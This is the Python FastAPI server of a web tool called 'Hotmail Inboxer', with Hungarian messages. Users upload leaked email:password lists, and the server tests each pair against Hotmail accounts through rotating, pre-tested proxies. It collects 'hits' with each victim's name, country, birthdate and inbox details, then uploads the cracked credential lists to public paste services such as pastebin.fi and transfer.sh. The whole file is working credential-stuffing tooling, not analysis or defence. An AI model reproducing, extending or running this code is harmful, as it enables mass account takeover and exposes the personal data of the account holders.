from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect, Depends, HTTPException
from fastapi.responses import HTMLResponse, PlainTextResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.requests import Request
from starlette.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
import asyncio
import threading
import os
import json
import requests
from datetime import datetime

from database import *
from auth import *
from checker import checker_worker_single
from proxy_manager import proxy_manager

user_connections = {}
ws_lock = threading.Lock()
stop_flags = {}
stop_lock = threading.Lock()


def upload_to_external_api(content: str, filename: str) -> str:
    if not content or len(content.strip()) == 0:
        return None
    try:
        res = requests.post("https://pastebin.fi/documents", data=content.encode('utf-8'), timeout=5)
        if res.status_code == 200:
            key = res.json().get("key")
            return f"https://pastebin.fi/raw/{key}"
    except:
        pass
    try:
        res = requests.put(f"https://transfer.sh/{filename}", data=content.encode('utf-8'), timeout=8)
        if res.status_code == 200:
            return res.text.strip()
    except:
        pass
    return None


@asynccontextmanager
async def lifespan(app: FastAPI):
    print("\n🔧 Startup - Proxy letöltés és tesztelés...")

    # ====== 1. PROXY LETÖLTÉS ======
    await asyncio.to_thread(proxy_manager.fetch_proxies)

    # ====== 2. PROXY TESZTELÉS ======
    working_count = await asyncio.to_thread(
        proxy_manager.test_and_filter,
        1500,   # 1500 proxyt tesztelünk
        300,    # 300 párhuzamos szál
        4       # 4 másodperc timeout
    )

    if working_count == 0:
        print("⚠️  FIGYELEM: Egyetlen proxy sem működik!")
        print("⚠️  A checker proxy nélkül fog futni!")
    else:
        print(f"🟢 {working_count} TESZTELT proxy készen áll!")

    # ====== 3. HÁTTÉRBEN PROXY FRISSÍTÉS (30 percenként) ======
    async def proxy_refresh_loop():
        while True:
            await asyncio.sleep(1800)
            print("\n🔄 Proxyk automatikus frissítése és tesztelése...")
            await asyncio.to_thread(proxy_manager.fetch_and_test)

    refresh_task = asyncio.create_task(proxy_refresh_loop())

    # ====== 4. DB CLEANUP ======
    from pymongo import MongoClient
    sync_client = MongoClient(os.getenv("MONGODB_URL"))
    db = sync_client.hotmail_checker
    running_runs = db.runs.find({"status": "running"})
    for run in running_runs:
        db.runs.update_one(
            {"_id": run["_id"]},
            {"$set": {"status": "finished", "finished_at": datetime.utcnow()}}
        )
    sync_client.close()

    yield

    print("\n🛑 Shutdown cleanup...")
    refresh_task.cancel()
    with stop_lock:
        for user_id in list(stop_flags.keys()):
            stop_flags[user_id].set()


app = FastAPI(title="Hotmail Inboxer (Tested Proxies)", lifespan=lifespan)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")


def broadcast_to_user(user_id: str, message: str):
    with ws_lock:
        if user_id not in user_connections:
            return
        dead = []
        for ws_info in user_connections[user_id]:
            try:
                asyncio.run_coroutine_threadsafe(ws_info["ws"].send_text(message), ws_info["loop"])
            except:
                dead.append(ws_info)
        for d in dead:
            user_connections[user_id].remove(d)
        if not user_connections[user_id]:
            del user_connections[user_id]


# ============================================================
# AUTH ROUTES
# ============================================================
@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})


@app.get("/register", response_class=HTMLResponse)
async def register_page(request: Request):
    return templates.TemplateResponse("register.html", {"request": request})


@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})


@app.post("/api/register")
async def register(email: str = Form(...), password: str = Form(...)):
    if len(password) < 6:
        raise HTTPException(status_code=400, detail="Minimum 6 karakter jelszó")
    if await get_user_by_email(email):
        raise HTTPException(status_code=400, detail="Foglalt email")
    await create_user(email, hash_password(password))
    return {"token": create_access_token({"sub": email}), "email": email}


@app.post("/api/login")
async def login(email: str = Form(...), password: str = Form(...)):
    user = await get_user_by_email(email)
    if not user or not verify_password(password, user["password"]):
        raise HTTPException(status_code=401, detail="Hibás adatok")
    return {"token": create_access_token({"sub": email}), "email": email}


# ============================================================
# PROXY ENDPOINTS
# ============================================================
@app.get("/api/proxy_status")
async def proxy_status(current_user=Depends(get_current_user)):
    return {
        "proxy_count": proxy_manager.get_count(),
        "tested": proxy_manager.is_tested(),
        "status": "active" if proxy_manager.get_count() > 0 else "no_proxies",
    }


@app.post("/api/refresh_proxies")
async def refresh_proxies(current_user=Depends(get_current_user)):
    count = await asyncio.to_thread(proxy_manager.fetch_and_test)
    return {"proxy_count": count, "message": f"{count} tesztelt proxy betöltve!"}


# ============================================================
# CHECKER LOGIC
# ============================================================
@app.post("/api/start")
async def start_checker(
    file: UploadFile,
    keyword: str = Form(...),
    speed: float = Form(0.3),
    current_user=Depends(get_current_user),
):
    if await get_active_run(str(current_user["_id"])):
        raise HTTPException(status_code=400, detail="Már fut egy checker!")

    speed = max(0.05, min(speed, 5.0))

    content = await file.read()
    lines = [
        l.strip()
        for l in content.decode("utf-8", errors="ignore").splitlines()
        if ':' in l and '@' in l and l.count(':') == 1
    ]
    if not lines:
        raise HTTPException(status_code=400, detail="Nincs érvényes email:jelszó sor")

    user_id = str(current_user["_id"])
    run_id = await create_run(user_id, keyword, len(lines))
    await delete_old_runs(user_id, run_id)

    with stop_lock:
        stop_flags[user_id] = asyncio.Event()

    threading.Thread(
        target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, speed)),
        daemon=True,
    ).start()

    return {
        "run_id": run_id,
        "total": len(lines),
        "speed": speed,
        "proxies": proxy_manager.get_count(),
        "tested": proxy_manager.is_tested(),
    }


@app.post("/api/stop")
async def stop_checker(current_user=Depends(get_current_user)):
    user_id = str(current_user["_id"])
    with stop_lock:
        if user_id in stop_flags:
            stop_flags[user_id].set()
            return {"status": "stopping"}
    raise HTTPException(status_code=404, detail="Nincs futó checker")


async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, speed: float = 0.3):
    checked = hits = custom = bad = retries = 0
    total = len(lines)
    stopped = False

    proxy_count = proxy_manager.get_count()
    tested_str = "✅ tesztelt" if proxy_manager.is_tested() else "⚠️ teszteletlen"
    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "info",
        "text": f"[START] {total} fiók | {keyword} | {speed}s | 🔒 {proxy_count} proxy ({tested_str})"
    }))

    for line in lines:
        with stop_lock:
            if user_id in stop_flags and stop_flags[user_id].is_set():
                stopped = True
                break

        try:
            email, password = line.split(':', 1)
        except:
            continue

        result = await asyncio.to_thread(checker_worker_single, email, password, keyword)
        checked += 1

        if result["status"] == "hit":
            hits += 1
            d = result["data"]
            lt = (
                f"{d['email']}:{d['password']} | Country={d['country']} | "
                f"Name={d['name']} | Birthdate={d['birthdate']} | "
                f"Mails={d['mails']} | LastMail={d['date']}"
            )
            await add_result_to_run(run_id, "hit", lt)
            await add_result_details_to_run(run_id, "hit", d)
            broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": f"[HIT] {lt}"}))
            broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": d}))

        elif result["status"] == "custom":
            custom += 1
            d = result["data"]
            lt = (
                f"{d['email']}:{d['password']} | Country={d['country']} | "
                f"Name={d['name']} | Birthdate={d['birthdate']}"
            )
            await add_result_to_run(run_id, "custom", lt)
            await add_result_details_to_run(run_id, "custom", d)
            broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": f"[CUSTOM] {lt}"}))
            broadcast_to_user(user_id, json.dumps({"type": "live_custom", "data": d}))

        elif result["status"] == "bad":
            bad += 1
            broadcast_to_user(user_id, json.dumps({
                "type": "log", "level": "bad",
                "text": f"[BAD] {email} (wrong password)"
            }))

        else:
            # error - max retries kimerült
            retries += 1
            broadcast_to_user(user_id, json.dumps({
                "type": "log", "level": "retry",
                "text": f"[RETRY FAILED] {email} - {result.get('reason', '?')}"
            }))

        await update_run_stats(run_id, {
            "checked": checked, "hits": hits, "custom": custom,
            "bad": bad, "retries": retries,
        })
        broadcast_to_user(user_id, json.dumps({
            "type": "stats", "run_id": run_id,
            "checked": checked, "hits": hits, "custom": custom,
            "bad": bad, "retries": retries, "total": total,
        }))
        await asyncio.sleep(speed)

    # ============ BEFEJEZÉS ============
    await update_run_status_only(run_id, "finished")

    if hits > 0 or custom > 0:
        broadcast_to_user(user_id, json.dumps({
            "type": "log", "level": "info",
            "text": "⏳ Eredmények feltöltése (Ne zárd be az oldalt)..."
        }))
        final_run = await get_run(run_id)
        if final_run:
            hit_lines = final_run.get("hit_lines", [])
            custom_lines = final_run.get("custom_lines", [])
            hits_url = (
                await asyncio.to_thread(upload_to_external_api, "\n".join(hit_lines), f"Hotmail_Hits_{run_id}.txt")
                if hit_lines else None
            )
            custom_url = (
                await asyncio.to_thread(upload_to_external_api, "\n".join(custom_lines), f"Hotmail_Custom_{run_id}.txt")
                if custom_lines else None
            )
            await finish_and_clean_run(run_id, hits_url, custom_url)
    else:
        await finish_and_clean_run(run_id, None, None)

    st_text = "LEÁLLÍTVA" if stopped else "KÉSZ"
    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "finish",
        "text": f"[{st_text}] Befejezve! Hits: {hits} | Custom: {custom} | Bad: {bad} | Retries: {retries}"
    }))
    broadcast_to_user(user_id, json.dumps({"type": "finished", "run_id": run_id}))

    with stop_lock:
        if user_id in stop_flags:
            del stop_flags[user_id]


# ============================================================
# API ENDPOINTS & DOWNLOAD
# ============================================================
@app.get("/api/runs")
async def get_user_runs_list(current_user=Depends(get_current_user)):
    runs = await get_user_finished_runs(str(current_user["_id"]))
    for r in runs:
        r["_id"] = str(r["_id"])
        r["started_at"] = r["started_at"].isoformat()
        if r.get("finished_at"):
            r["finished_at"] = r["finished_at"].isoformat()
    return runs


@app.get("/api/get_download_url/{run_id}/{type}")
async def get_download_url(run_id: str, type: str, current_user=Depends(get_current_user)):
    run = await get_run(run_id)
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404)
    if type == "hits" and run.get("hits_url"):
        return {"url": run["hits_url"]}
    if type == "custom" and run.get("custom_url"):
        return {"url": run["custom_url"]}
    return {"url": f"/api/download_direct/{run_id}/{type}?token={current_user['email']}"}


@app.get("/api/download_direct/{run_id}/{type}")
async def download_direct(run_id: str, type: str):
    run = await get_run(run_id)
    if not run:
        raise HTTPException(status_code=404)
    lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
    return PlainTextResponse(
        content="\n".join(lines) if lines else "Nincs eredmény",
        headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'},
    )


# ============================================================
# WEBSOCKET
# ============================================================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = ""):
    await websocket.accept()
    email = decode_token(token)
    if not email:
        return await websocket.close(code=1008)
    user = await get_user_by_email(email)
    if not user:
        return await websocket.close(code=1008)

    user_id = str(user["_id"])
    loop = asyncio.get_event_loop()
    ws_info = {"ws": websocket, "loop": loop}
    with ws_lock:
        if user_id not in user_connections:
            user_connections[user_id] = []
        user_connections[user_id].append(ws_info)

    try:
        await websocket.send_text(json.dumps({
            "type": "proxy_info",
            "count": proxy_manager.get_count(),
            "tested": proxy_manager.is_tested(),
        }))
    except:
        pass

    active_run = await get_active_run(user_id)
    if active_run:
        active_run["_id"] = str(active_run["_id"])
        active_run["started_at"] = active_run["started_at"].isoformat()
        try:
            await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))
            for hit in active_run.get("hit_details", []):
                await websocket.send_text(json.dumps({"type": "live_hit", "data": hit}))
            for c in active_run.get("custom_details", []):
                await websocket.send_text(json.dumps({"type": "live_custom", "data": c}))
        except:
            pass

    try:
        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
    except (WebSocketDisconnect, RuntimeError, Exception):
        with ws_lock:
            if user_id in user_connections and ws_info in user_connections[user_id]:
                user_connections[user_id].remove(ws_info)


if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    print("\n" + "=" * 60)
    print("  🚀 Hotmail Inboxer - TESTED PROXY EDITION")
    print(f"  📡 http://0.0.0.0:{port}")
    print("=" * 60 + "\n")
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False, log_level="info")
